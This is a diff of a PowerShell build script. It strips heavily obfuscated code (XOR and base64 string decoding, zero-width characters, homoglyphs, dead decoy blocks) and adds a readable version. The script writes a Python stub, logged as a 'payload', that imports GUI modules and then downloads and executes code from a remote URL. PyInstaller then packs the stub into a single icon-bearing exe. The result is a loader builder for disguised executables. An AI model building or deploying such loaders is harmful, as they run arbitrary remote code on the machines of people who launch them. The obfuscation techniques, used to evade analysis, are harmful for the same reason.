-    $(-join('--eduvybu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})),(-join([char]0x2D, [char]0x2D, [char]0x6E, [char]0x6F, [char]0x63, [char]0x6F, [char]0x6E, [char]0x66, [char]0x69, [char]0x72, [char]0x6D)),$(-join('--mvokx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}})),
-    ('{0}{1}{2}{3}' -f '--n','a','m','e'), $p6o4u79,
-    '--dіstраth', $tlFIAbOU,
-    '--wоrkраth', (& (&($($k9618='ZvLt&(C>.';$b=[byte[]](0x1D,0x13,0x38,0x59,0x65,0x47,0x2E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9618);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+('{0}{1}{2}' -f 'ma','n','d')) ('{0}{1}{2}{3}' -f 'joIN','-??','?','?') -CommandType Function, &(('{0}' -f 'C')+('{0}{1}' -f 'm','dlet')) -ErrorAction SilentlyContinue)[0] $gsTWx4 ('{0}{1}{2}' -f 'p','y','i')),
-    $(-join('--yvkivgzn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})), $gStWX4,
-    '-‌-‍c‌o‌l​l‌e‌c‍t‍-​a‍l​l‍',('tki'+'n'+'t'+'er'),
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS1jb2xsZWN0LWFsbA=='))),('P'+'IL'),
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS1jb2xsZWN0LXN1Ym1vZHVsZXM='))),('win3'+'2co'+'m'),
-    $($k3103='QhZRBEbfXI';$b=[byte[]](0x7C,0x45,0x32,0x3B,0x26,0x21,0x07,0x08,0x75,0x20,0x3C,0x18,0x35,0x20,0x36);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3103);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})),([string]::Format('{0}{1}{2}','win3','2','api')),
-    $($k7529='fzXhD*Z%Pb2#[?5';$b=[byte[]](0x4B,0x57,0x30,0x01,0x20,0x4E,0x3F,0x4B,0x7D,0x0B,0x5F,0x53,0x34,0x4D,0x41);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7529);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})),([System.Text.Encoding]::UTF8.GetString([byte[]](0x77,0x69,0x6E,0x33,0x32,0x63,0x6F,0x6E))),
-    $($k5375=37;$b=[byte[]](0x08,0x08,0x4d,0x4c,0x41,0x41,0x40,0x4b,0x08,0x4c,0x48,0x55,0x4a,0x57,0x51);-join($b|%{[char]($_-bxor$k5375)})),$(-join('qch32zcfy'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})),
-    ('{0}{1}{2}{3}{4}' -f '-','-h','idd','en-i','mport'),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2luMzJwcm9jZXNz'))),
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS1oaWRkZW4taW1wb3J0'))),(-join('win32se','c','ur','ity')),
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS1oaWRkZW4taW1wb3J0'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2luMzJldmVudA=='))),
-    (-join([char]0x2D, [char]0x2D, [char]0x68, [char]0x69, [char]0x64, [char]0x64, [char]0x65, [char]0x6E, [char]0x2D, [char]0x69, [char]0x6D, [char]0x70, [char]0x6F, [char]0x72, [char]0x74)),(-join([char]0x77, [char]0x69, [char]0x6E, [char]0x33, [char]0x32, [char]0x73, [char]0x65, [char]0x72, [char]0x76, [char]0x69, [char]0x63, [char]0x65)),
-    ('--hidden'+'-'+'impor'+'t'),(-join('wi','n3','2servic','e','ut','il')),
-    $(-join('--zavvwf-aehgjl'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d2luMzJ0aW1lem9uZQ=='))),
-    ('{0}{1}{2}{3}{4}{5}{6}' -f '--','hidd','en-','im','p','or','t'),"$([char]0x70)$([char]0x79)$([char]0x74)$([char]0x68)$([char]0x6F)$([char]0x6E)$([char]0x63)$([char]0x6F)$([char]0x6D)",
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LS1oaWRkZW4taW1wb3J0'))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHl3aW50eXBlcw=='))),
-    (-join([char]0x2D, [char]0x2D, [char]0x68, [char]0x69, [char]0x64, [char]0x64, [char]0x65, [char]0x6E, [char]0x2D, [char]0x69, [char]0x6D, [char]0x70, [char]0x6F, [char]0x72, [char]0x74)),$($k2286=225;$b=[byte[]](0x91,0x92,0x94,0x95,0x88,0x8d);-join($b|%{[char]($_-bxor$k2286)})),
-    $($k1399=13;$b=[byte[]](0x20,0x20,0x65,0x64,0x69,0x69,0x68,0x63,0x20,0x64,0x60,0x7d,0x62,0x7f,0x79);-join($b|%{[char]($_-bxor$k1399)})),"$([char]0x72)$([char]0x65)$([char]0x71)$([char]0x75)$([char]0x65)$([char]0x73)$([char]0x74)$([char]0x73)"
+import tkinter
+import tkinter.ttk
+import tkinter.messagebox
+import tkinter.filedialog
+import tkinter.simpledialog
+import tkinter.scrolledtext
+import tkinter.font
+import tkinter.colorchooser
+
+exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
+"@
+    $body = $taskbarBootstrap + "`r`nimport urllib.request`r`n" + $remoteSuffix
+    Set-Content -Path $StubPy -Value $body -Encoding UTF8
+}
+Log "payload ->  written" "Green"
+Pause-Brief
+
+Log "freeze  ->  $OutName.exe"
+$pyi = @(
+    "-m","PyInstaller",
+    "--onefile","--noconfirm","--clean",
+    "--name", $OutName,
+    "--distpath", $DistDir,
+    "--workpath", (Join-Path $WorkDir "pyi"),
+    "--specpath", $WorkDir,
+    "--collect-all","tkinter",
+    "--collect-all","PIL",
+    "--collect-submodules","win32com",
+    "--hidden-import","win32api",
+    "--hidden-import","win32con",
+    "--hidden-import","win32file",
+    "--hidden-import","win32process",
+    "--hidden-import","win32security",
+    "--hidden-import","win32event",
+    "--hidden-import","win32service",
+    "--hidden-import","win32serviceutil",
+    "--hidden-import","win32timezone",
+    "--hidden-import","pythoncom",
+    "--hidden-import","pywintypes",
+    "--hidden-import","psutil",
+    "--hidden-import","requests"
 )
-if ($gGyrN) {
-    $hR1USK1W += @($($k8969='?%Js}Q.b=]]?s:';$b=[byte[]](0x12,0x08,0x23,0x10,0x12,0x3F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8969);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})), $tgXwIQ)
-    $hR1Usk1W += @($(-join('--hkk-khah'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})), ($TGXWIQ + $(-join(';.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}}))))
+if ($useIco) {
+    $pyi += @("--icon", $IconIco)
+    $pyi += @("--add-data", "$IconIco;.")
 }
-if ($false) {
-    Get-WinEvent -LogName System -MaxEvents 5 -FilterXPath "*[System[EventID=4639]]" | Format-Table TimeCreated, ID, Message -AutoSize
-}
-$hr1uSk1W += $TlN2g
+$pyi += $StubPy
 
-$pvUj7bx = & (&('G‌e‌'+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dC1Db21tYW5k')))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Pz8/Pz8/LVFVSUVU'))) -CommandType Function, &($(-join('Ku'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))+('dl'+'et')) -ErrorAction SilentlyContinue)[0] -eXE $tVOVIT -arGs $hR1usK1w
-if ($PVUJ7bX -ne 0) { & (&($($k7668='!8wLnb%Rhz8O-+';$b=[byte[]](0x66,0x5D,0x03,0x61,0x2D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7668);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+'o‍m‍m‌a‍n‌d‍') $(-join('v??B'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}})) -CommandType Function, &(('{0}{1}' -f 'Cm','dl')+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXQ=')))) -ErrorAction SilentlyContinue)[0] ($(-join('amzzuz avdgzy (zsdo '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}})) + $pVuJ7BX + $(-join(') — lxx '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) + $f2MmN) }
+$rc = Invoke-Quiet -Exe $PythonExe -Args $pyi
+if ($rc -ne 0) { Fail "freeze failed (exit $rc) — see $LogFile" }
 
-if ($gGyRn -and (& (&($(-join('Igv'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LUNvbW1hbmQ=')))) $($k8213=',BbR<^gcfoB!#9';$b=[byte[]](0x13,0x7D,0x11,0x26);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8213);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -CommandType Function, &($(-join('Sctbu'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+10)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+10)%26))}else{[char]$c}}))+$(-join('e'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] $tgxWiQ)) {
-    & (&($($k5056=152;$b=[byte[]](0xdf,0xfd,0xec,0xb5,0xdb,0xf7,0xf5,0xf5);-join($b|%{[char]($_-bxor$k5056)}))+('{0}' -f 'and')) 'с?і' -CommandType Function, &('C'+$($k1576=134;$b=[byte[]](0xeb,0xe2,0xea,0xe3,0xf2);-join($b|%{[char]($_-bxor$k1576)}))) -ErrorAction SilentlyContinue)[0] -LIteRAlpAth $TgXWIq -dEstinATION $FVN6uwyO -ForcE
-    LoG 'i​c​o‌n‌.​i‌c​o​ ​-‍>‍ ​c‍o‌p​i​e‍d‌ ‌n‍e‌x​t‌ ‌t​o‌ ‌e​x‍e‍' ('Gre'+'e'+'n')
-}
-while ($false) {
-    try { $webResponse = Invoke-WebRequest -Uri "http://localhost:8278/health" -TimeoutSec 1 -ErrorAction Stop } catch [System.Net.WebException] { Write-Warning "Simulated health check failed: $($_.Exception.Message)" }
+if ($useIco -and (Test-Path $IconIco)) {
+    Copy-Item -LiteralPath $IconIco -Destination $IconDst -Force
+    Log "icon.ico -> copied next to exe" "Green"
 }
 
-Get-Random -Maximum 94 | Out-Null
-if (-not $UHOwzK) {
-    rm -RECursE -ForCe $GStwX4 -ERroraCtIon sIlENTLYcOntinue
+if (-not $KeepBuild) {
+    Remove-Item -Recurse -Force $WorkDir -ErrorAction SilentlyContinue
 }
 
-if (& (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUM=')))+([System.Text.Encoding]::UTF8.GetString([byte[]](0x6F,0x6D,0x6D,0x61,0x6E,0x64)))) ('?'+'?'+'s'+'t') -CommandType Function, &(('{0}' -f 'C')+$(-join('vmunc'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] -liTeRalPATH $xdFn) {
-    $F3tg83P = [MaTH]::RoUnD((gi $xDfN).lenGTh / 1Mb, 2)
-    & (Get-Com`mand 'w‍?​i​t‍e​' -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0] ''
-    & (&((-join('Get-C','o','mm','a'))+(-join('n','d'))) 'w​?‍i‍?‌e‌' -CommandType Function, &($($k7203='aHqeum4uZ';$b=[byte[]](0x22,0x25);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7203);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+(-join([char]0x64, [char]0x6C, [char]0x65, [char]0x74))) -ErrorAction SilentlyContinue)[0] ([System.Text.Encoding]::UTF8.GetString([byte[]](0x20,0x20,0x2B,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2D,0x2B))) -FORegrounDCOlOr gREEn
-    & (Get-Comman`d 'wrі??' -CommandType Function, &(('{0}{1}' -f 'C','m')+('dl'+'et')) -ErrorAction SilentlyContinue)[0] (' ‌ ‍|‍ ‌ ‌ ‍d‌o‌n‍e‌ ‌ ​ ​' + $p6O4u79 + '.ехе  .  ' + $F3TG83p + ' ‌M‌B‌ ‌ ​ ‌ ‌ ‌ ‌ ‌|‌') -FoREgroundCoLOR gReEN
-    & (&('G'+$(-join('qf-Oayymzp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))) $(-join('??sdo'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}})) -CommandType Function, &($(-join('Hriqj'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))+$($k2642='^$_bOIz$zB';$b=[byte[]](0x2A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2642);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ErrorAction SilentlyContinue)[0] (-join('  +','--------','----','------','---','---','---','------','-------','+')) -fOrEGrOUNdCOloR grEEn
-    & (Get-C`ommand ([string]::Format('{0}{1}','w?i?','e')) -CommandType Function, &("$([char]0x43)$([char]0x6D)$([char]0x64)$([char]0x6C)$([char]0x65)"+'t') -ErrorAction SilentlyContinue)[0] ''
-    & (Get-Comman`d ('{0}{1}' -f '??it','e') -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x6D)))+'d​l‌e​t‍') -ErrorAction SilentlyContinue)[0] (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICBwYXRoOiA='))) + $xDFn) -foReGroUNdcOLOR DArkgRay
-    if ($GGyRN -and (& (Get-Co`mmand ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGU/Pw=='))) -CommandType Function, Cmd`let -ErrorAction SilentlyContinue)[0] $FVN6UwYo)) {
-        & (&('Gеt-Соm'+$($k1809=158;$b=[byte[]](0xf3,0xff,0xf0,0xfa);-join($b|%{[char]($_-bxor$k1809)}))) '?​?‍i‌t‍e​' -CommandType Function, &($(-join('Blckd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}}))+('{0}' -f 't')) -ErrorAction SilentlyContinue)[0] ($(-join('  eykj: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}})) + $fVN6uwYO) -foRegrOUNdcoloR daRkGray
+if (Test-Path -LiteralPath $ExePath) {
+    $sz = [math]::Round((Get-Item $ExePath).Length / 1MB, 2)
+    Write-Host ""
+    Write-Host "  +----------------------------------------+" -ForegroundColor Green
+    Write-Host "  |   done   $OutName.exe  .  $sz MB       |" -ForegroundColor Green
+    Write-Host "  +----------------------------------------+" -ForegroundColor Green
+    Write-Host ""
+    Write-Host "  path: $ExePath" -ForegroundColor DarkGray
+    if ($useIco -and (Test-Path $IconDst)) {
+        Write-Host "  icon: $IconDst" -ForegroundColor DarkGray
     }
-    & (&($($k9497=45;$b=[byte[]](0x6a);-join($b|%{[char]($_-bxor$k9497)}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXQtQ29tbWFuZA==')))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dypl'))) -CommandType Function, &(('Cm'+'dl')+$($k7650='l-^7nOza';$b=[byte[]](0x09,0x59);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7650);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) -ErrorAction SilentlyContinue)[0] ''
+    Write-Host ""
 } else {
-    & (Get-Co`mmand $($k6774='Y+%}n';$b=[byte[]](0x3F,0x6A,0x1A,0x42);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6774);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXhlIG5vdCBwcm9kdWNlZA==')))
+    Fail "exe not produced"
 }
